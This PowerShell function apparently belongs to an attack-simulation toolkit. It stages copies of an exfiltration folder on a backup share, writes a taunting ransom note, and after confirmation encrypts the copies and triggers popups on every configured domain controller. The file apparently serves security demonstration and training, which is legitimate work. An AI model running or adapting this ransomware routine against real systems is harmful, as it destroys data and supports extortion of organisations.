<#
.SYNOPSIS
Copies exfiltration-folder files into a timestamped backup-share subfolder and adds a demonstration ransom note.

.FUNCTIONALITY
Copies exfiltration-folder files into a timestamped backup-share subfolder and adds a demonstration ransom note.
After confirmation, encrypts the copied files with a machine certificate and attempts popups on configured DCs.
Demonstrates ransomware impact on staged copies; encryption requires a suitable certificate.
#>
function New-RansomwareAttack {

    Param([string]$BackupShare)

    $Info = Measure-FunctionRuntime -Begin

    Write-AS2GoOutput -Type Header -Message "New-RansomwareAttack"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
    $CurrentFunction = $Info.FunctionName

    #prepare the simulation
    $TargetPath = $Script:DefautExfiltrationFolder
    $postfix = (Get-Date).toString("yyyyMMdd_HHmmss")
    $filePrefix = "RW-" + $postfix

    #create temp directory and fill the directory
    $FolderToEncrypt = "$BackupShare\$postfix"

    if (-not (Test-Path -Path $FolderToEncrypt)) {
        New-Item -Path $FolderToEncrypt -ItemType Directory -ErrorAction Ignore | Out-Null
    }

    if (-not (Test-Path -Path $FolderToEncrypt -PathType Container)) {
        Write-AS2GoOutput -Type Warning -Message "Unable to create folder '$FolderToEncrypt' - aborting simulation."
        Write-Log -Message "### Exit Function $CurrentFunction ###"
        return
    }

    Copy-Item "$TargetPath\*.*" -Destination $FolderToEncrypt -Exclude *.exe, *.ps1, .vs*

    # create info for the victim
    $newFile = "$TargetPath\$filePrefix.txt"
    (Get-Date).toString("yyyy-MM-dd HH:mm:ss") + "  | Hi user '$env:USERNAME', next time I will encrypt the complete Domain Controller."  | Out-File -FilePath $newFile 
    Get-Item $FolderToEncrypt\*.* | Out-File -FilePath $newFile -Append
    Copy-Item -Path "$TargetPath\$filePrefix.txt" -Destination $FolderToEncrypt -Recurse

    Write-AS2GoOutput -Type TextMaker -Message "Starting to encrypt all files in folder" -TextMaker $FolderToEncrypt

    $question = "Do you REALLY want to run this step? [Y/N] Default "
    $answer = Get-Answer -question $question -defaultValue $Script:No

    If ($answer -eq $Script:Yes) {
        $affectedDC = $BackupShare.split("\")[2]
        $sourceFile = Join-Path -Path $Script:ASSetup -ChildPath "Encryption\preview.html"
          
        Write-AS2GoOutput -Type Info -Message "Content of file '$FolderToEncrypt\$filePrefix.txt' before encryption:"
        Invoke-Item "$FolderToEncrypt\$filePrefix.txt"
        Invoke-FileEncryption -share $FolderToEncrypt
        Write-AS2GoOutput -Type Textmaker -Message "The following file is one of the files that were encrypted: --> " -TM "$FolderToEncrypt\$filePrefix.txt" 
        Invoke-Item "$FolderToEncrypt\$filePrefix.txt"

        foreach ($computer in $Script:AllDCs) {
            $affectedDC = $computer.FQDN
            Start-AS2GoDemoPopup -ComputerName $affectedDC -SourceFile $sourceFile

        }

    }
    Measure-FunctionRuntime -End -Details $Info
}
